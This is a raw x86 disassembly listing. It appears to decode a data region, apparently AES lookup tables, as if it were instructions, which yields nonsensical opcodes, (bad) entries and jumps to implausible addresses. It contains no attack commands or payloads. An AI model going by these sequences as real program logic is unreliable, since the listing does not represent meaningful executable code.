  402df3:	09 83 1d 9e 83 2c    	or     %eax,0x2c839e1d(%ebx)
  402df9:	58                   	pop    %eax
  402dfa:	74 2c                	je     0x402e28
  402dfc:	1a 34 2e             	sbb    (%esi,%ebp,1),%dh
  402dff:	1a 1b                	sbb    (%ebx),%bl
  402e01:	36 2d 1b 6e dc b2    	ss sub $0xb2dc6e1b,%eax
  402e07:	6e                   	outsb  %ds:(%esi),(%dx)
  402e08:	5a                   	pop    %edx
  402e09:	b4 ee                	mov    $0xee,%ah
  402e0b:	5a                   	pop    %edx
  402e0c:	a0 5b fb a0 52       	mov    0x52a0fb5b,%al
  402e11:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402e12:	f6 52 3b             	notb   0x3b(%edx)
  402e15:	76 4d                	jbe    0x402e64
  402e17:	3b d6                	cmp    %esi,%edx
  402e19:	b7 61                	mov    $0x61,%bh
  402e1b:	d6                   	salc
  402e1c:	b3 7d                	mov    $0x7d,%bl
  402e1e:	ce                   	into
  402e1f:	b3 29                	mov    $0x29,%bl
  402e21:	52                   	push   %edx
  402e22:	7b 29                	jnp    0x402e4d
  402e24:	e3 dd                	jecxz  0x402e03
  402e26:	3e e3 2f             	jecxz,pt 0x402e58
  402e29:	5e                   	pop    %esi
  402e2a:	71 2f                	jno    0x402e5b
  402e2c:	84 13                	test   %dl,(%ebx)
  402e2e:	97                   	xchg   %eax,%edi
  402e2f:	84 53 a6             	test   %dl,-0x5a(%ebx)
  402e32:	f5                   	cmc
  402e33:	53                   	push   %ebx
  402e34:	d1 b9 68 d1 00 00    	sarl   $1,0xd168(%ecx)
  402e3a:	00 00                	add    %al,(%eax)
  402e3c:	ed                   	in     (%dx),%eax
  402e3d:	c1 2c ed 20 40 60 20 	shrl   $0xfc,0x20604020(,%ebp,8)
  402e44:	fc 
  402e45:	e3 1f                	jecxz  0x402e66
  402e47:	fc                   	cld
  402e48:	b1 79                	mov    $0x79,%cl
  402e4a:	c8 b1 5b b6          	enter  $0x5bb1,$0xb6
  402e4e:	ed                   	in     (%dx),%eax
  402e4f:	5b                   	pop    %ebx
  402e50:	6a d4                	push   $0xffffffd4
  402e52:	be 6a cb 8d 46       	mov    $0x468dcb6a,%esi
  402e57:	cb                   	lret
  402e58:	be 67 d9 be 39       	mov    $0x39bed967,%esi
  402e5d:	72 4b                	jb     0x402eaa
  402e5f:	39 4a 94             	cmp    %ecx,-0x6c(%edx)
  402e62:	de 4a 4c             	fimuls 0x4c(%edx)
  402e65:	98                   	cwtl
  402e66:	d4 4c                	aam    $0x4c
  402e68:	58                   	pop    %eax
  402e69:	b0 e8                	mov    $0xe8,%al
  402e6b:	58                   	pop    %eax
  402e6c:	cf                   	iret
  402e6d:	85 4a cf             	test   %ecx,-0x31(%edx)
  402e70:	d0 bb 6b d0 ef c5    	sarb   $1,-0x3a102f95(%ebx)
  402e76:	2a ef                	sub    %bh,%ch
  402e78:	aa                   	stos   %al,%es:(%edi)
  402e79:	4f                   	dec    %edi
  402e7a:	e5 aa                	in     $0xaa,%eax
  402e7c:	fb                   	sti
  402e7d:	ed                   	in     (%dx),%eax
  402e7e:	16                   	push   %ss
  402e7f:	fb                   	sti
  402e80:	43                   	inc    %ebx
  402e81:	86 c5                	xchg   %al,%ch
  402e83:	43                   	inc    %ebx
  402e84:	4d                   	dec    %ebp
  402e85:	9a d7 4d 33 66 55 33 	lcall  $0x3355,$0x66334dd7
  402e8c:	85 11                	test   %edx,(%ecx)
  402e8e:	94                   	xchg   %eax,%esp
  402e8f:	85 45 8a             	test   %eax,-0x76(%ebp)
  402e92:	cf                   	iret
  402e93:	45                   	inc    %ebp
  402e94:	f9                   	stc
  402e95:	e9 10 f9 02 04       	jmp    0x44327aa
  402e9a:	06                   	push   %es
  402e9b:	02 7f fe             	add    -0x2(%edi),%bh
  402e9e:	81 7f 50 a0 f0 50 3c 	cmpl   $0x3c50f0a0,0x50(%edi)
  402ea5:	78 44                	js     0x402eeb
  402ea7:	3c 9f                	cmp    $0x9f,%al
  402ea9:	25 ba 9f a8 4b       	and    $0x4ba89fba,%eax
  402eae:	e3 a8                	jecxz  0x402e58
  402eb0:	51                   	push   %ecx
  402eb1:	a2 f3 51 a3 5d       	mov    %al,0x5da351f3
  402eb6:	fe                   	(bad)
  402eb7:	a3 40 80 c0 40       	mov    %eax,0x40c08040
  402ebc:	8f 05 8a 8f 92 3f    	pop    0x3f928f8a
  402ec2:	ad                   	lods   %ds:(%esi),%eax
  402ec3:	92                   	xchg   %eax,%edx
  402ec4:	9d                   	popf
  402ec5:	21 bc 9d 38 70 48 38 	and    %edi,0x38487038(%ebp,%ebx,4)
  402ecc:	f5                   	cmc
  402ecd:	f1                   	int1
  402ece:	04 f5                	add    $0xf5,%al
  402ed0:	bc 63 df bc b6       	mov    $0xb6bcdf63,%esp
  402ed5:	77 c1                	ja     0x402e98
  402ed7:	b6 da                	mov    $0xda,%dh
  402ed9:	af                   	scas   %es:(%edi),%eax
  402eda:	75 da                	jne    0x402eb6
  402edc:	21 42 63             	and    %eax,0x63(%edx)
  402edf:	21 10                	and    %edx,(%eax)
  402ee1:	20 30                	and    %dh,(%eax)
  402ee3:	10 ff                	adc    %bh,%bh
  402ee5:	e5 1a                	in     $0x1a,%eax
  402ee7:	ff f3                	push   %ebx
  402ee9:	fd                   	std
  402eea:	0e                   	push   %cs
  402eeb:	f3 d2 bf 6d d2 cd 81 	repz sarb %cl,-0x7e322d93(%edi)
  402ef2:	4c                   	dec    %esp
  402ef3:	cd 0c                	int    $0xc
  402ef5:	18 14 0c             	sbb    %dl,(%esp,%ecx,1)
  402ef8:	13 26                	adc    (%esi),%esp
  402efa:	35 13 ec c3 2f       	xor    $0x2fc3ec13,%eax
  402eff:	ec                   	in     (%dx),%al
  402f00:	5f                   	pop    %edi
  402f01:	be e1 5f 97 35       	mov    $0x35975fe1,%esi
  402f06:	a2 97 44 88 cc       	mov    %al,0xcc884497
  402f0b:	44                   	inc    %esp
  402f0c:	17                   	pop    %ss
  402f0d:	2e 39 17             	cmp    %edx,%cs:(%edi)
  402f10:	c4 93 57 c4 a7 55    	les    0x55a7c457(%ebx),%edx
  402f16:	f2 a7                	repnz cmpsl %es:(%edi),%ds:(%esi)
  402f18:	7e fc                	jle    0x402f16
  402f1a:	82 7e 3d 7a          	cmpb   $0x7a,0x3d(%esi)
  402f1e:	47                   	inc    %edi
  402f1f:	3d 64 c8 ac 64       	cmp    $0x64acc864,%eax
  402f24:	5d                   	pop    %ebp
  402f25:	ba e7 5d 19 32       	mov    $0x32195de7,%edx
  402f2a:	2b 19                	sub    (%ecx),%ebx
  402f2c:	73 e6                	jae    0x402f14
  402f2e:	95                   	xchg   %eax,%ebp
  402f2f:	73 60                	jae    0x402f91
  402f31:	c0 a0 60 81 19 98 81 	shlb   $0x81,-0x67e67ea0(%eax)
  402f38:	4f                   	dec    %edi
  402f39:	9e                   	sahf
  402f3a:	d1 4f dc             	rorl   $1,-0x24(%edi)
  402f3d:	a3 7f dc 22 44       	mov    %eax,0x4422dc7f
  402f42:	66 22 2a             	data16 and (%edx),%ch
  402f45:	54                   	push   %esp
  402f46:	7e 2a                	jle    0x402f72
  402f48:	90                   	nop
  402f49:	3b ab 90 88 0b 83    	cmp    -0x7cf47770(%ebx),%ebp
  402f4f:	88 46 8c             	mov    %al,-0x74(%esi)
  402f52:	ca 46 ee             	lret   $0xee46
  402f55:	c7                   	(bad)
  402f56:	29 ee                	sub    %ebp,%esi
  402f58:	b8 6b d3 b8 14       	mov    $0x14b8d36b,%eax
  402f5d:	28 3c 14             	sub    %bh,(%esp,%edx,1)
  402f60:	de a7 79 de 5e bc    	fisubs -0x43a12187(%edi)
  402f66:	e2 5e                	loop   0x402fc6
  402f68:	0b 16                	or     (%esi),%edx
  402f6a:	1d 0b db ad 76       	sbb    $0x76addb0b,%eax
  402f6f:	db e0                	fneni(8087 only)
  402f71:	db 3b                	fstpt  (%ebx)
  402f73:	e0 32                	loopne 0x402fa7
  402f75:	64 56                	fs push %esi
  402f77:	32 3a                	xor    (%edx),%bh
  402f79:	74 4e                	je     0x402fc9
  402f7b:	3a 0a                	cmp    (%edx),%cl
  402f7d:	14 1e                	adc    $0x1e,%al
  402f7f:	0a 49 92             	or     -0x6e(%ecx),%cl
  402f82:	db 49 06             	fisttpl 0x6(%ecx)
  402f85:	0c 0a                	or     $0xa,%al
  402f87:	06                   	push   %es
  402f88:	24 48                	and    $0x48,%al
  402f8a:	6c                   	insb   (%dx),%es:(%edi)
  402f8b:	24 5c                	and    $0x5c,%al
  402f8d:	b8 e4 5c c2 9f       	mov    $0x9fc25ce4,%eax
  402f92:	5d                   	pop    %ebp
  402f93:	c2 d3 bd             	ret    $0xbdd3
  402f96:	6e                   	outsb  %ds:(%esi),(%dx)
  402f97:	d3 ac 43 ef ac 62 c4 	shrl   %cl,-0x3b9d5311(%ebx,%eax,2)
  402f9e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402f9f:	62 91 39 a8 91 95    	bound  %edx,-0x6a6e57c7(%ecx)
  402fa5:	31 a4 95 e4 d3 37 e4 	xor    %esp,-0x1bc82c1c(%ebp,%edx,4)
  402fac:	79 f2                	jns    0x402fa0
  402fae:	8b 79 e7             	mov    -0x19(%ecx),%edi
  402fb1:	d5 32                	aad    $0x32
  402fb3:	e7 c8                	out    %eax,$0xc8
  402fb5:	8b 43 c8             	mov    -0x38(%ebx),%eax
  402fb8:	37                   	aaa
  402fb9:	6e                   	outsb  %ds:(%esi),(%dx)
  402fba:	59                   	pop    %ecx
  402fbb:	37                   	aaa
  402fbc:	6d                   	insl   (%dx),%es:(%edi)
  402fbd:	da b7 6d 8d 01 8c    	fidivl -0x73fe7293(%edi)
  402fc3:	8d                   	lea    (bad),%edx
  402fc4:	d5 b1                	aad    $0xb1
  402fc6:	64 d5 4e             	fs aad $0x4e
  402fc9:	9c                   	pushf
  402fca:	d2 4e a9             	rorb   %cl,-0x57(%esi)
  402fcd:	49                   	dec    %ecx
  402fce:	e0 a9                	loopne 0x402f79
  402fd0:	6c                   	insb   (%dx),%es:(%edi)
  402fd1:	d8 b4 6c 56 ac fa 56 	fdivs  0x56faac56(%esp,%ebp,2)
  402fd8:	f4                   	hlt
  402fd9:	f3 07                	repz pop %es
  402fdb:	f4                   	hlt
  402fdc:	ea cf 25 ea 65 ca af 	ljmp   $0xafca,$0x65ea25cf
  402fe3:	65 7a f4             	gs jp  0x402fda
  402fe6:	8e 7a ae             	mov    -0x52(%edx),%?
  402fe9:	47                   	inc    %edi
  402fea:	e9 ae 08 10 18       	jmp    0x1850389d
  402fef:	08 ba 6f d5 ba 78    	or     %bh,0x78bad56f(%edx)
  402ff5:	f0 88 78 25          	lock mov %bh,0x25(%eax)
  402ff9:	4a                   	dec    %edx
  402ffa:	6f                   	outsl  %ds:(%esi),(%dx)
  402ffb:	25 2e 5c 72 2e       	and    $0x2e725c2e,%eax
  403000:	1c 38                	sbb    $0x38,%al
  403002:	24 1c                	and    $0x1c,%al
  403004:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403005:	57                   	push   %edi
  403006:	f1                   	int1
  403007:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403008:	b4 73                	mov    $0x73,%ah
  40300a:	c7                   	(bad)
  40300b:	b4 c6                	mov    $0xc6,%ah
  40300d:	97                   	xchg   %eax,%edi
  40300e:	51                   	push   %ecx
  40300f:	c6                   	(bad)
  403010:	e8 cb 23 e8 dd       	call   0xde2853e0
  403015:	a1 7c dd 74 e8       	mov    0xe874dd7c,%eax
  40301a:	9c                   	pushf
  40301b:	74 1f                	je     0x40303c
  40301d:	3e 21 1f             	and    %ebx,%ds:(%edi)
  403020:	4b                   	dec    %ebx
  403021:	96                   	xchg   %eax,%esi
  403022:	dd 4b bd             	fisttpll -0x43(%ebx)
  403025:	61                   	popa
  403026:	dc bd 8b 0d 86 8b    	fdivrl -0x7479f275(%ebp)
  40302c:	8a 0f                	mov    (%edi),%cl
  40302e:	85 8a 70 e0 90 70    	test   %ecx,0x7090e070(%edx)
  403034:	3e 7c 42             	jl,pt  0x403079
  403037:	3e b5 71             	ds mov $0x71,%ch
  40303a:	c4 b5 66 cc aa 66    	les    0x66aacc66(%ebp),%esi
  403040:	48                   	dec    %eax
  403041:	90                   	nop
  403042:	d8 48 03             	fmuls  0x3(%eax)
  403045:	06                   	push   %es
  403046:	05 03 f6 f7 01       	add    $0x1f7f603,%eax
  40304b:	f6 0e 1c             	testb  $0x1c,(%esi)
  40304e:	12 0e                	adc    (%esi),%cl
  403050:	61                   	popa
  403051:	c2 a3 61             	ret    $0x61a3
  403054:	35 6a 5f 35 57       	xor    $0x57355f6a,%eax
  403059:	ae                   	scas   %es:(%edi),%al
  40305a:	f9                   	stc
  40305b:	57                   	push   %edi
  40305c:	b9 69 d0 b9 86       	mov    $0x86b9d069,%ecx
  403061:	17                   	pop    %ss
  403062:	91                   	xchg   %eax,%ecx
  403063:	86 c1                	xchg   %al,%cl
  403065:	99                   	cltd
  403066:	58                   	pop    %eax
  403067:	c1 1d 3a 27 1d 9e 27 	rcrl   $0x27,0x9e1d273a
  40306e:	b9 9e e1 d9 38       	mov    $0x38d9e19e,%ecx
  403073:	e1 f8                	loope  0x40306d
  403075:	eb 13                	jmp    0x40308a
  403077:	f8                   	clc
  403078:	98                   	cwtl
  403079:	2b b3 98 11 22 33    	sub    0x33221198(%ebx),%esi
  40307f:	11 69 d2             	adc    %ebp,-0x2e(%ecx)
  403082:	bb 69 d9 a9 70       	mov    $0x70a9d969,%ebx
  403087:	d9 8e 07 89 8e 94    	(bad) -0x6b7176f9(%esi)
  40308d:	33 a7 94 9b 2d b6    	xor    -0x49d2646c(%edi),%esp
  403093:	9b                   	fwait
  403094:	1e                   	push   %ds
  403095:	3c 22                	cmp    $0x22,%al
  403097:	1e                   	push   %ds
  403098:	87 15 92 87 e9 c9    	xchg   %edx,0xc9e98792
  40309e:	20 e9                	and    %ch,%cl
  4030a0:	ce                   	into
  4030a1:	87 49 ce             	xchg   %ecx,-0x32(%ecx)
  4030a4:	55                   	push   %ebp
  4030a5:	aa                   	stos   %al,%es:(%edi)
  4030a6:	ff 55 28             	call   *0x28(%ebp)
  4030a9:	50                   	push   %eax
  4030aa:	78 28                	js     0x4030d4
  4030ac:	df a5 7a df 8c 03    	fbld   0x38cdf7a(%ebp)
  4030b2:	8f                   	(bad)
  4030b3:	8c a1 59 f8 a1 89    	mov    %fs,-0x765e07a7(%ecx)
  4030b9:	09 80 89 0d 1a 17    	or     %eax,0x171a0d89(%eax)
  4030bf:	0d bf 65 da bf       	or     $0xbfda65bf,%eax
  4030c4:	e6 d7                	out    %al,$0xd7
  4030c6:	31 e6                	xor    %esp,%esi
  4030c8:	42                   	inc    %edx
  4030c9:	84 c6                	test   %al,%dh
  4030cb:	42                   	inc    %edx
  4030cc:	68 d0 b8 68 41       	push   $0x4168b8d0
  4030d1:	82 c3 41             	add    $0x41,%bl
  4030d4:	99                   	cltd
  4030d5:	29 b0 99 2d 5a 77    	sub    %esi,0x775a2d99(%eax)
  4030db:	2d 0f 1e 11 0f       	sub    $0xf111e0f,%eax
  4030e0:	b0 7b                	mov    $0x7b,%al
  4030e2:	cb                   	lret
  4030e3:	b0 54                	mov    $0x54,%al
  4030e5:	a8 fc                	test   $0xfc,%al
  4030e7:	54                   	push   %esp
  4030e8:	bb 6d d6 bb 16       	mov    $0x16bbd66d,%ebx
  4030ed:	2c 3a                	sub    $0x3a,%al
  4030ef:	16                   	push   %ss
  4030f0:	c6                   	(bad)
  4030f1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4030f2:	63 63 f8             	arpl   %esp,-0x8(%ebx)
  4030f5:	84 7c 7c ee          	test   %bh,-0x12(%esp,%edi,2)
  4030f9:	99                   	cltd
  4030fa:	77 77                	ja     0x403173
  4030fc:	f6 8d 7b 7b ff 0d f2 	testb  $0xf2,0xdff7b7b(%ebp)
  403103:	f2 d6                	repnz salc
  403105:	bd 6b 6b de b1       	mov    $0xb1de6b6b,%ebp
  40310a:	6f                   	outsl  %ds:(%esi),(%dx)
  40310b:	6f                   	outsl  %ds:(%esi),(%dx)
  40310c:	91                   	xchg   %eax,%ecx
  40310d:	54                   	push   %esp
  40310e:	c5 c5 60 50 30       	vpunpcklbw 0x30(%eax),%ymm7,%ymm2
  403113:	30 02                	xor    %al,(%edx)
  403115:	03 01                	add    (%ecx),%eax
  403117:	01 ce                	add    %ecx,%esi
  403119:	a9 67 67 56 7d       	test   $0x7d566767,%eax
  40311e:	2b 2b                	sub    (%ebx),%ebp
  403120:	e7 19                	out    %eax,$0x19
  403122:	fe                   	(bad)
  403123:	fe                   	(bad)
  403124:	b5 62                	mov    $0x62,%ch
  403126:	d7                   	xlat   %ds:(%ebx)
  403127:	d7                   	xlat   %ds:(%ebx)
  403128:	4d                   	dec    %ebp
  403129:	e6 ab                	out    %al,$0xab
  40312b:	ab                   	stos   %eax,%es:(%edi)
  40312c:	ec                   	in     (%dx),%al
  40312d:	9a 76 76 8f 45 ca ca 	lcall  $0xcaca,$0x458f7676
  403134:	1f                   	pop    %ds
  403135:	9d                   	popf
  403136:	82 82 89 40 c9 c9 fa 	addb   $0xfa,-0x3636bf77(%edx)
  40313d:	87 7d 7d             	xchg   %edi,0x7d(%ebp)
  403140:	ef                   	out    %eax,(%dx)
  403141:	15 fa fa b2 eb       	adc    $0xebb2fafa,%eax
  403146:	59                   	pop    %ecx
  403147:	59                   	pop    %ecx
  403148:	8e c9                	mov    %ecx,%cs
  40314a:	47                   	inc    %edi
  40314b:	47                   	inc    %edi
  40314c:	fb                   	sti
  40314d:	0b f0                	or     %eax,%esi
  40314f:	f0 41                	lock inc %ecx
  403151:	ec                   	in     (%dx),%al
  403152:	ad                   	lods   %ds:(%esi),%eax
  403153:	ad                   	lods   %ds:(%esi),%eax
  403154:	b3 67                	mov    $0x67,%bl
  403156:	d4 d4                	aam    $0xd4
  403158:	5f                   	pop    %edi
  403159:	fd                   	std
  40315a:	a2 a2 45 ea af       	mov    %al,0xafea45a2
  40315f:	af                   	scas   %es:(%edi),%eax
  403160:	23 bf 9c 9c 53 f7    	and    -0x8ac6364(%edi),%edi
  403166:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403167:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403168:	e4 96                	in     $0x96,%al
  40316a:	72 72                	jb     0x4031de
  40316c:	9b                   	fwait
  40316d:	5b                   	pop    %ebx
  40316e:	c0 c0 75             	rol    $0x75,%al
  403171:	c2 b7 b7             	ret    $0xb7b7
  403174:	e1 1c                	loope  0x403192
  403176:	fd                   	std
  403177:	fd                   	std
  403178:	3d ae 93 93 4c       	cmp    $0x4c9393ae,%eax
  40317d:	6a 26                	push   $0x26
  40317f:	26 6c                	es insb (%dx),%es:(%edi)
  403181:	5a                   	pop    %edx
  403182:	36 36 7e 41          	ss ss jle 0x4031c7
  403186:	3f                   	aas
  403187:	3f                   	aas
  403188:	f5                   	cmc
  403189:	02 f7                	add    %bh,%dh
  40318b:	f7 83 4f cc cc 68 5c 	testl  $0x5134345c,0x68cccc4f(%ebx)
  403192:	34 34 51 
  403195:	f4                   	hlt
  403196:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403197:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403198:	d1 34 e5 e5 f9 08 f1 	shll   $1,-0xef7061b(,%eiz,8)
  40319f:	f1                   	int1
  4031a0:	e2 93                	loop   0x403135
  4031a2:	71 71                	jno    0x403215
  4031a4:	ab                   	stos   %eax,%es:(%edi)
  4031a5:	73 d8                	jae    0x40317f
  4031a7:	d8 62 53             	fsubs  0x53(%edx)
  4031aa:	31 31                	xor    %esi,(%ecx)
  4031ac:	2a 3f                	sub    (%edi),%bh
  4031ae:	15 15 08 0c 04       	adc    $0x40c0815,%eax
  4031b3:	04 95                	add    $0x95,%al
  4031b5:	52                   	push   %edx
  4031b6:	c7 c7 46 65 23 23    	mov    $0x23236546,%edi
  4031bc:	9d                   	popf
  4031bd:	5e                   	pop    %esi
  4031be:	c3                   	ret
  4031bf:	c3                   	ret
  4031c0:	30 28                	xor    %ch,(%eax)
  4031c2:	18 18                	sbb    %bl,(%eax)
  4031c4:	37                   	aaa
  4031c5:	a1 96 96 0a 0f       	mov    0xf0a9696,%eax
  4031ca:	05 05 2f b5 9a       	add    $0x9ab52f05,%eax
  4031cf:	9a 0e 09 07 07 24 36 	lcall  $0x3624,$0x707090e
  4031d6:	12 12                	adc    (%edx),%dl
  4031d8:	1b 9b 80 80 df 3d    	sbb    0x3ddf8080(%ebx),%ebx
  4031de:	e2 e2                	loop   0x4031c2
  4031e0:	cd 26                	int    $0x26
  4031e2:	eb eb                	jmp    0x4031cf
  4031e4:	4e                   	dec    %esi
  4031e5:	69 27 27 7f cd b2    	imul   $0xb2cd7f27,(%edi),%esp
  4031eb:	b2 ea                	mov    $0xea,%dl
  4031ed:	9f                   	lahf
  4031ee:	75 75                	jne    0x403265
  4031f0:	12 1b                	adc    (%ebx),%bl
  4031f2:	09 09                	or     %ecx,(%ecx)
  4031f4:	1d 9e 83 83 58       	sbb    $0x5883839e,%eax
  4031f9:	74 2c                	je     0x403227
  4031fb:	2c 34                	sub    $0x34,%al
  4031fd:	2e 1a 1a             	sbb    %cs:(%edx),%bl
  403200:	36 2d 1b 1b dc b2    	ss sub $0xb2dc1b1b,%eax
  403206:	6e                   	outsb  %ds:(%esi),(%dx)
  403207:	6e                   	outsb  %ds:(%esi),(%dx)
  403208:	b4 ee                	mov    $0xee,%ah
  40320a:	5a                   	pop    %edx
  40320b:	5a                   	pop    %edx
  40320c:	5b                   	pop    %ebx
  40320d:	fb                   	sti
  40320e:	a0 a0 a4 f6 52       	mov    0x52f6a4a0,%al
  403213:	52                   	push   %edx
  403214:	76 4d                	jbe    0x403263
  403216:	3b 3b                	cmp    (%ebx),%edi
  403218:	b7 61                	mov    $0x61,%bh
  40321a:	d6                   	salc
  40321b:	d6                   	salc
  40321c:	7d ce                	jge    0x4031ec
  40321e:	b3 b3                	mov    $0xb3,%bl
  403220:	52                   	push   %edx
  403221:	7b 29                	jnp    0x40324c
  403223:	29 dd                	sub    %ebx,%ebp
  403225:	3e e3 e3             	jecxz,pt 0x40320b
  403228:	5e                   	pop    %esi
  403229:	71 2f                	jno    0x40325a
  40322b:	2f                   	das
  40322c:	13 97 84 84 a6 f5    	adc    -0xa597b7c(%edi),%edx
  403232:	53                   	push   %ebx
  403233:	53                   	push   %ebx
  403234:	b9 68 d1 d1 00       	mov    $0xd1d168,%ecx
  403239:	00 00                	add    %al,(%eax)
  40323b:	00 c1                	add    %al,%cl
  40323d:	2c ed                	sub    $0xed,%al
  40323f:	ed                   	in     (%dx),%eax
  403240:	40                   	inc    %eax
  403241:	60                   	pusha
  403242:	20 20                	and    %ah,(%eax)
  403244:	e3 1f                	jecxz  0x403265
  403246:	fc                   	cld
  403247:	fc                   	cld
  403248:	79 c8                	jns    0x403212
  40324a:	b1 b1                	mov    $0xb1,%cl
  40324c:	b6 ed                	mov    $0xed,%dh
  40324e:	5b                   	pop    %ebx
  40324f:	5b                   	pop    %ebx
  403250:	d4 be                	aam    $0xbe
  403252:	6a 6a                	push   $0x6a
  403254:	8d 46 cb             	lea    -0x35(%esi),%eax
  403257:	cb                   	lret
  403258:	67 d9 be be 72       	fnstcw 0x72be(%bp)
  40325d:	4b                   	dec    %ebx
  40325e:	39 39                	cmp    %edi,(%ecx)
  403260:	94                   	xchg   %eax,%esp
  403261:	de 4a 4a             	fimuls 0x4a(%edx)
  403264:	98                   	cwtl
  403265:	d4 4c                	aam    $0x4c
  403267:	4c                   	dec    %esp
  403268:	b0 e8                	mov    $0xe8,%al
  40326a:	58                   	pop    %eax
  40326b:	58                   	pop    %eax
  40326c:	85 4a cf             	test   %ecx,-0x31(%edx)
  40326f:	cf                   	iret
  403270:	bb 6b d0 d0 c5       	mov    $0xc5d0d06b,%ebx
  403275:	2a ef                	sub    %bh,%ch
  403277:	ef                   	out    %eax,(%dx)
  403278:	4f                   	dec    %edi
  403279:	e5 aa                	in     $0xaa,%eax
  40327b:	aa                   	stos   %al,%es:(%edi)
  40327c:	ed                   	in     (%dx),%eax
  40327d:	16                   	push   %ss
  40327e:	fb                   	sti
  40327f:	fb                   	sti
  403280:	86 c5                	xchg   %al,%ch
  403282:	43                   	inc    %ebx
  403283:	43                   	inc    %ebx
  403284:	9a d7 4d 4d 66 55 33 	lcall  $0x3355,$0x664d4dd7
  40328b:	33 11                	xor    (%ecx),%edx
  40328d:	94                   	xchg   %eax,%esp
  40328e:	85 85 8a cf 45 45    	test   %eax,0x4545cf8a(%ebp)
  403294:	e9 10 f9 f9 04       	jmp    0x53a2ba9
  403299:	06                   	push   %es
  40329a:	02 02                	add    (%edx),%al
  40329c:	fe 81 7f 7f a0 f0    	incb   -0xf5f8081(%ecx)
  4032a2:	50                   	push   %eax
  4032a3:	50                   	push   %eax
  4032a4:	78 44                	js     0x4032ea
  4032a6:	3c 3c                	cmp    $0x3c,%al
  4032a8:	25 ba 9f 9f 4b       	and    $0x4b9f9fba,%eax
  4032ad:	e3 a8                	jecxz  0x403257
  4032af:	a8 a2                	test   $0xa2,%al
  4032b1:	f3 51                	repz push %ecx
  4032b3:	51                   	push   %ecx
  4032b4:	5d                   	pop    %ebp
  4032b5:	fe                   	(bad)
  4032b6:	a3 a3 80 c0 40       	mov    %eax,0x40c080a3
  4032bb:	40                   	inc    %eax
  4032bc:	05 8a 8f 8f 3f       	add    $0x3f8f8f8a,%eax
  4032c1:	ad                   	lods   %ds:(%esi),%eax
  4032c2:	92                   	xchg   %eax,%edx
  4032c3:	92                   	xchg   %eax,%edx
  4032c4:	21 bc 9d 9d 70 48 38 	and    %edi,0x3848709d(%ebp,%ebx,4)
  4032cb:	38 f1                	cmp    %dh,%cl
  4032cd:	04 f5                	add    $0xf5,%al
  4032cf:	f5                   	cmc
  4032d0:	63 df                	arpl   %ebx,%edi
  4032d2:	bc bc 77 c1 b6       	mov    $0xb6c177bc,%esp
  4032d7:	b6 af                	mov    $0xaf,%dh
  4032d9:	75 da                	jne    0x4032b5
  4032db:	da 42 63             	fiaddl 0x63(%edx)
  4032de:	21 21                	and    %esp,(%ecx)
  4032e0:	20 30                	and    %dh,(%eax)
  4032e2:	10 10                	adc    %dl,(%eax)
  4032e4:	e5 1a                	in     $0x1a,%eax
  4032e6:	ff                   	(bad)
  4032e7:	ff                   	(bad)
  4032e8:	fd                   	std
  4032e9:	0e                   	push   %cs
  4032ea:	f3 f3 bf 6d d2 d2 81 	repz repz mov $0x81d2d26d,%edi
  4032f1:	4c                   	dec    %esp
  4032f2:	cd cd                	int    $0xcd
  4032f4:	18 14 0c             	sbb    %dl,(%esp,%ecx,1)
  4032f7:	0c 26                	or     $0x26,%al
  4032f9:	35 13 13 c3 2f       	xor    $0x2fc31313,%eax
  4032fe:	ec                   	in     (%dx),%al
  4032ff:	ec                   	in     (%dx),%al
  403300:	be e1 5f 5f 35       	mov    $0x355f5fe1,%esi
  403305:	a2 97 97 88 cc       	mov    %al,0xcc889797
  40330a:	44                   	inc    %esp
  40330b:	44                   	inc    %esp
  40330c:	2e 39 17             	cmp    %edx,%cs:(%edi)
  40330f:	17                   	pop    %ss
  403310:	93                   	xchg   %eax,%ebx
  403311:	57                   	push   %edi
  403312:	c4                   	(bad)
  403313:	c4 55 f2             	les    -0xe(%ebp),%edx
  403316:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403317:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403318:	fc                   	cld
  403319:	82 7e 7e 7a          	cmpb   $0x7a,0x7e(%esi)
  40331d:	47                   	inc    %edi
  40331e:	3d 3d c8 ac 64       	cmp    $0x64acc83d,%eax
  403323:	64 ba e7 5d 5d 32    	fs mov $0x325d5de7,%edx
  403329:	2b 19                	sub    (%ecx),%ebx
  40332b:	19 e6                	sbb    %esp,%esi
  40332d:	95                   	xchg   %eax,%ebp
  40332e:	73 73                	jae    0x4033a3
  403330:	c0 a0 60 60 19 98 81 	shlb   $0x81,-0x67e69fa0(%eax)
  403337:	81 9e d1 4f 4f a3 7f 	sbbl   $0x44dcdc7f,-0x5cb0b02f(%esi)
  40333e:	dc dc 44 
  403341:	66 22 22             	data16 and (%edx),%ah
  403344:	54                   	push   %esp
  403345:	7e 2a                	jle    0x403371
  403347:	2a 3b                	sub    (%ebx),%bh
  403349:	ab                   	stos   %eax,%es:(%edi)
  40334a:	90                   	nop
  40334b:	90                   	nop
  40334c:	0b 83 88 88 8c ca    	or     -0x35737778(%ebx),%eax
  403352:	46                   	inc    %esi
  403353:	46                   	inc    %esi
  403354:	c7                   	(bad)
  403355:	29 ee                	sub    %ebp,%esi
  403357:	ee                   	out    %al,(%dx)
  403358:	6b d3 b8             	imul   $0xffffffb8,%ebx,%edx
  40335b:	b8 28 3c 14 14       	mov    $0x14143c28,%eax
  403360:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403361:	79 de                	jns    0x403341
  403363:	de bc e2 5e 5e 16 1d 	fidivrs 0x1d165e5e(%edx,%eiz,8)
  40336a:	0b 0b                	or     (%ebx),%ecx
  40336c:	ad                   	lods   %ds:(%esi),%eax
  40336d:	76 db                	jbe    0x40334a
  40336f:	db db                	fcmovnu %st(3),%st
  403371:	3b e0                	cmp    %eax,%esp
  403373:	e0 64                	loopne 0x4033d9
  403375:	56                   	push   %esi
  403376:	32 32                	xor    (%edx),%dh
  403378:	74 4e                	je     0x4033c8
  40337a:	3a 3a                	cmp    (%edx),%bh
  40337c:	14 1e                	adc    $0x1e,%al
